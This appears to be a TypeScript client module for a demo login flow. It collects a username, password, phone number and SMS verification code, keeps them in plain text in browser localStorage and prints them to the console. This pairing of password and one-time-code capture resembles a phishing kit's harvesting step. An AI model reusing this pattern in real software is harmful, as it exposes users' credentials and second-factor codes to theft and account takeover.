"use client"

// Simple client-side data capture for demo purposes
export async function submitLogin(username: string, password: string) {
  try {
    const timestamp = new Date().toISOString()
    const sessionId = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`

    // Store login data in browser storage
    const loginData = {
      sessionId,
      username,
      password,
      timestamp,
      step: "login",
    }

    localStorage.setItem("currentSession", JSON.stringify(loginData))
    console.log("Login data captured:", loginData)

    return { success: true, sessionId }
  } catch (error) {
    console.error("Login error:", error)
    return { success: false, error: "Login failed" }
  }
}

export async function submitSmsVerification(sessionId: string, phoneNumber: string, smsCode: string) {
  try {
    const currentSession = JSON.parse(localStorage.getItem("currentSession") || "{}")

    const completeData = {
      ...currentSession,
      phoneNumber,
      smsCode,
      completedAt: new Date().toISOString(),
      step: "completed",
    }

    // Store complete data
    const allData = JSON.parse(localStorage.getItem("loginDatabase") || "[]")
    allData.push(completeData)
    localStorage.setItem("loginDatabase", JSON.stringify(allData))

    console.log("Complete login data captured:", completeData)

    // Clear current session
    localStorage.removeItem("currentSession")

    return { success: true }
  } catch (error) {
    console.error("SMS verification error:", error)
    return { success: false, error: "Verification failed" }
  }
}
